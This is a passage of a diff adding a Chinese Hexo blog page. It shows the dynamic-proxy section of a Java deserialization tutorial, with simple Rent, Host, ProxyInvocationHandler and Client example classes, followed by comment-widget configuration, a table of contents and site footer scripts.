+<li>客户调用被代理对象的某一方法，此时java会将访问代理对象这个请求转发给动态代理对象proxy，并且在proxy的invoke中实现该方法</li>
+</ul>
+<h3 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h3><p>Rent接口 被代理对象和proxy对象共同实现的接口：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Rent</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Host 被代理对象:</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Host</span> <span class="keyword">implements</span> <span class="title class_">Rent</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">        System.out.println(<span class="string">"房东要出租房子"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>动态代理工具类 ProxyInvocationHandler：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> {</span><br><span class="line">    <span class="keyword">private</span> Rent rent;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 使用动态代理时通过setter传入要被代理的对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRent</span><span class="params">(Rent rent)</span> {</span><br><span class="line">        <span class="built_in">this</span>.rent = rent;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 通过getProxy方法获得一个动态代理实例</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getProxy</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">			<span class="comment">// 通过Proxy.newProxyInstance初始化一个动态代理对象出来 三个参数基本上只有第二个是变化的，为被代理的接口，其他两个参数可以像这里一样写死</span></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="built_in">this</span>.getClass().getClassLoader(), rent.getClass().getInterfaces(), <span class="built_in">this</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">		<span class="comment">// 当调用一个被代理对象的方法时，会在此处执行，invoke内可以自己构造如何执行该方法，从而达到了扩展方法功能的目的</span></span><br><span class="line">		<span class="comment">// 三个参数分别为 代理对象 代理对象被调用的方法 调用该方法的参数</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable {</span><br><span class="line">       <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span>  method.invoke(rent,args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Client</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Host</span>();</span><br><span class="line">        <span class="type">ProxyInvocationHandler</span> <span class="variable">pih</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyInvocationHandler</span>();</span><br><span class="line">        pih.setRent(host); <span class="comment">// 将要代理的对象设置为host</span></span><br><span class="line">        <span class="type">Rent</span> <span class="variable">proxy</span> <span class="operator">=</span> (Rent) pih.getProxy(); <span class="comment">// 拿到被代理接口的代理对象</span></span><br><span class="line">        proxy.rent(); <span class="comment">// 调用该方法后会将这个方法传给代理对象中的invoke方法来执行</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#Java反序列化</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/04/24/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%89%8D%E7%BD%AE%E6%89%AB%E7%9B%B2/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">区块链安全前置扫盲</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/04/21/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Nodejs原型链污染</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI',
+              appKey: '7gIuYJ9YQk94en6wRudankYd',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'Hi speak something！',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('https://ycemvr5n.api.lncldglobal.com') {
+              config.serverURLs = 'https://ycemvr5n.api.lncldglobal.com'
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'y1zh3e7'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">Java原生序列化&#x2F;反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E7%AF%87"><span class="nav-text">Java反序列化入门篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-IO"><span class="nav-text">Java IO</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="nav-text">Java序列化和反序列化的过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%92%8CJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">php和Java反序列化之间的区别</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84-URLDNS"><span class="nav-text">反射+URLDNS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%8F%8D%E5%B0%84%E7%AF%87"><span class="nav-text">Java反射篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">反射常用到的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Eforname"><span class="nav-text">关于forname</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">如何通过反射执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="nav-text">一些其他的反射机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ProcessBuilder%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">利用ProcessBuilder执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E6%89%A7%E8%A1%8C%E7%A7%81%E6%9C%89%E6%96%B9%E6%B3%95"><span class="nav-text">如何通过反射执行私有方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ysoserial"><span class="nav-text">ysoserial</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URLDNS"><span class="nav-text">URLDNS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F"><span class="nav-text">代理模式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%BB%A3%E7%90%86%EF%BC%9F"><span class="nav-text">什么是代理？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-text">静态代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-text">动态代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%EF%BC%9A"><span class="nav-text">代码实现：</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2023</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">y1zh3e7</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
